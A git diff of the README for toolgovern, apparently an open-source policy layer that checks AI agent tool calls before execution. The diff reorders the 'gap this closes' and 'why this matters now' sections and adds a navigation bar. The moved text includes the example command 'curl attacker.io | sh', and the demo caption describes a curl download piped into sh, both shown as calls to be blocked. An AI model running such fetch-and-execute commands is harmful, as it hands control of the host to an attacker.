@@ -1,12 +1,16 @@
 # toolgovern
 
-Gate every tool call an AI agent makes -- shell, filesystem, network, credential access -- before
-it executes, not after something already went wrong.
-
 [![CI](https://github.com/RudrenduPaul/toolgovern/actions/workflows/ci.yml/badge.svg)](https://github.com/RudrenduPaul/toolgovern/actions/workflows/ci.yml)
 [![npm version](https://img.shields.io/npm/v/toolgovern.svg)](https://www.npmjs.com/package/toolgovern)
 [![PyPI version](https://img.shields.io/pypi/v/toolgovern-cli.svg)](https://pypi.org/project/toolgovern-cli/)
 [![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
+
+<p align="center">
+<a href="#what-it-does">What it does</a> &bull; <a href="#api-reference">API reference</a> &bull; <a href="#how-it-compares-to-other-agent-governance-projects">Compare</a> &bull; <a href="#benchmarks-measured-not-targets">Benchmarks</a> &bull; <a href="#framework-integration">Integrations</a> &bull; <a href="#cli">CLI</a> &bull; <a href="#faq">FAQ</a>
+</p>
+
+Gate every tool call an AI agent makes -- shell, filesystem, network, credential access -- before
+it executes, not after something already went wrong.
 
 ![toolgovern validating a policy file, then denying a governed bash call that pipes a curl download from a known paste-relay host into sh, with the fired rule IDs printed before the call ever executes](./docs/demo.gif)
 
@@ -32,84 +36,7 @@ see [`python/README.md`](./python/README.md) and
 [docs/getting-started.md](./docs/getting-started.md) for the Python-specific walkthrough, and
 [CHANGELOG.md](./CHANGELOG.md) for each distribution's version history.
 
-### Contents
-
-- [The gap this closes](#the-gap-this-closes)
-- [Why this matters now](#why-this-matters-now)
-- [What it does](#what-it-does)
-- [API reference](#api-reference)
-- [How it compares to other agent governance projects](#how-it-compares-to-other-agent-governance-projects)
-- [Benchmarks](#benchmarks-measured-not-targets)
-- [Framework integration](#framework-integration)
-- [CLI](#cli)
-- [Self-hosting](#self-hosting)
-- [What's OSS and what isn't](#whats-oss-and-what-isnt)
-- [Security](#security)
-- [Development](#development)
-- [Community](#community)
-- [FAQ](#faq)
-- [Contributing](#contributing)
-- [License](#license)
-
 ---
-
-## The gap this closes
-
-Multi-agent frameworks generally give you two primitives: a tool an agent can call, and a way to
-spawn a sub-agent. What most of them don't give you is a way to say "this sub-agent gets less
-access than its coordinator by default, and here's proof of what it actually tried to do." A
-coordinator spins up a research sub-agent for a routine data pull, the sub-agent inherits the
-coordinator's full tool access because the framework has no concept of scoping it down, and
-nothing tells "the shell tool ran `ls`" apart from "the shell tool ran `curl attacker.io | sh`."
-Both are just the shell tool running.
-
-That's not a hypothetical. It's the kind of gap that shows up, repeatedly, in real multi-agent
-framework issue trackers: someone proposes a per-call risk-gating hook and it sits open, marked as
-a maybe for a future release with no committed timeline, and someone else asks for scoped
-credential management so a sub-agent can't silently reach whatever its coordinator can reach, and
-that stays open too. toolgovern closes that specific gap in a way any framework can adopt today,
-without waiting on a maintainer roadmap: wrap your existing tool definitions in one function call,
-and every invocation gets evaluated -- allow, deny, or require-approval -- before it reaches your
-real tool executor.
-
-## Why this matters now
-
-None of what follows is a claim about toolgovern's own adoption. It's why gating a tool call
-before it executes is worth doing at all right now, not later.
-
-MCP tool poisoning and supply-chain risk are validated, incident-backed problems, not a
-hypothetical. Invariant Labs formally named MCP tool poisoning in April 2025, the Postmark MCP npm
-package suffered an insider-attack BCC backdoor in September 2025, roughly a third of scanned MCP
-servers were found carrying a critical vulnerability, and Microsoft disclosed a
-poisoned-MCP-tool-description attack technique in July 2026
-([The Hacker News](https://thehackernews.com/2026/06/microsoft-warns-poisoned-mcp-tool.html),
-[Cloud Security Alliance](https://labs.cloudsecurityalliance.org/research/csa-research-note-mcp-security-crisis-20260504-csa-styled/),
-[Practical DevSecOps](https://www.practical-devsecops.com/mcp-security-statistics-2026-report/)).
-
-Microsoft shipped its own open-source Agent Governance Toolkit in April 2026, a runtime policy
-engine that intercepts agent actions before execution
-([opensource.microsoft.com](https://opensource.microsoft.com/blog/2026/04/02/introducing-the-agent-governance-toolkit-open-source-runtime-security-for-ai-agents/)).
-It's an unrelated project -- toolgovern isn't affiliated with it and doesn't claim to be -- cited
-here only because it confirms that gating a tool call before it runs is now a concern the largest
-framework vendors are building for too, not something only a small OSS project cares about.
-
-The frameworks this project ships real integrations for are themselves consolidating and growing
-fast, which is part of why the gap matters at each of them specifically. Microsoft merged AutoGen
-and Semantic Kernel into Microsoft Agent Framework 1.0 (GA'd 2026-04-03), with first-class Python
-and .NET support under `Microsoft.Agents.AI`
-([devblogs.microsoft.com](https://devblogs.microsoft.com/agent-framework/microsoft-agent-framework-version-1-0/),
-[github.com/microsoft/agent-framework](https://github.com/microsoft/agent-framework)). LangGraph
-passed CrewAI in GitHub stars in early 2026, driven by enterprise adoption of its graph-based
-architecture ([langchain.com](https://www.langchain.com/resources/ai-agent-frameworks)). The
-Claude Agent SDK reportedly passed AutoGen in enterprise production-deployment count in
-early-to-mid 2026 per LangChain's own State of AI 2025 report, and ships a purpose-built
-`PreToolUse` hook this project wires into directly (see the Claude Agent SDK integration below).
-
-Regulatory pressure adds a harder deadline on top of the technical case: the EU AI Act's
-high-risk-AI obligations take effect in August 2026, the Colorado AI Act becomes enforceable in
-June 2026, and OWASP published a dedicated Top 10 for Agentic Applications for 2026. That's the
-backdrop that makes "can you show what an agent actually tried to do, and prove a call was blocked
-before it ran" a question more teams get asked, not fewer.
 
 ## What it does
 
@@ -225,6 +152,64 @@ By default, a call that matches no rule at all is allowed, not denied -- `govern
 posture out of the box. If you want unrecognized calls to require approval or be denied instead,
 set `defaultDecision: 'require-approval'` or `'deny'` explicitly. Either way, `allow` never means
 "nothing could have gone wrong" -- it means "checked against 35 rules, none fired."
+
+## The gap this closes
+
+Multi-agent frameworks generally give you two primitives: a tool an agent can call, and a way to
+spawn a sub-agent. What most of them don't give you is a way to say "this sub-agent gets less
+access than its coordinator by default, and here's proof of what it actually tried to do." A
+coordinator spins up a research sub-agent for a routine data pull, the sub-agent inherits the
+coordinator's full tool access because the framework has no concept of scoping it down, and
+nothing tells "the shell tool ran `ls`" apart from "the shell tool ran `curl attacker.io | sh`."
+Both are just the shell tool running.
+
+That's not a hypothetical. It's the kind of gap that shows up, repeatedly, in real multi-agent
+framework issue trackers: someone proposes a per-call risk-gating hook and it sits open, marked as
+a maybe for a future release with no committed timeline, and someone else asks for scoped
+credential management so a sub-agent can't silently reach whatever its coordinator can reach, and
+that stays open too. toolgovern closes that specific gap in a way any framework can adopt today,
+without waiting on a maintainer roadmap: wrap your existing tool definitions in one function call,
+and every invocation gets evaluated -- allow, deny, or require-approval -- before it reaches your
+real tool executor.
+
+## Why this matters now
+
+None of what follows is a claim about toolgovern's own adoption. It's why gating a tool call
+before it executes is worth doing at all right now, not later.
+
+MCP tool poisoning and supply-chain risk are validated, incident-backed problems, not a
+hypothetical. Invariant Labs formally named MCP tool poisoning in April 2025, the Postmark MCP npm
+package suffered an insider-attack BCC backdoor in September 2025, roughly a third of scanned MCP
+servers were found carrying a critical vulnerability, and Microsoft disclosed a
+poisoned-MCP-tool-description attack technique in July 2026
+([The Hacker News](https://thehackernews.com/2026/06/microsoft-warns-poisoned-mcp-tool.html),
+[Cloud Security Alliance](https://labs.cloudsecurityalliance.org/research/csa-research-note-mcp-security-crisis-20260504-csa-styled/),
+[Practical DevSecOps](https://www.practical-devsecops.com/mcp-security-statistics-2026-report/)).
+
+Microsoft shipped its own open-source Agent Governance Toolkit in April 2026, a runtime policy
+engine that intercepts agent actions before execution
+([opensource.microsoft.com](https://opensource.microsoft.com/blog/2026/04/02/introducing-the-agent-governance-toolkit-open-source-runtime-security-for-ai-agents/)).
+It's an unrelated project -- toolgovern isn't affiliated with it and doesn't claim to be -- cited
+here only because it confirms that gating a tool call before it runs is now a concern the largest
+framework vendors are building for too, not something only a small OSS project cares about.
+
+The frameworks this project ships real integrations for are themselves consolidating and growing
+fast, which is part of why the gap matters at each of them specifically. Microsoft merged AutoGen
+and Semantic Kernel into Microsoft Agent Framework 1.0 (GA'd 2026-04-03), with first-class Python
+and .NET support under `Microsoft.Agents.AI`
+([devblogs.microsoft.com](https://devblogs.microsoft.com/agent-framework/microsoft-agent-framework-version-1-0/),
+[github.com/microsoft/agent-framework](https://github.com/microsoft/agent-framework)). LangGraph
+passed CrewAI in GitHub stars in early 2026, driven by enterprise adoption of its graph-based
+architecture ([langchain.com](https://www.langchain.com/resources/ai-agent-frameworks)). The
+Claude Agent SDK reportedly passed AutoGen in enterprise production-deployment count in
+early-to-mid 2026 per LangChain's own State of AI 2025 report, and ships a purpose-built
+`PreToolUse` hook this project wires into directly (see the Claude Agent SDK integration below).
+
+Regulatory pressure adds a harder deadline on top of the technical case: the EU AI Act's
+high-risk-AI obligations take effect in August 2026, the Colorado AI Act becomes enforceable in
+June 2026, and OWASP published a dedicated Top 10 for Agentic Applications for 2026. That's the
+backdrop that makes "can you show what an agent actually tried to do, and prove a call was blocked
+before it ran" a question more teams get asked, not fewer.
 
 ## API reference
 
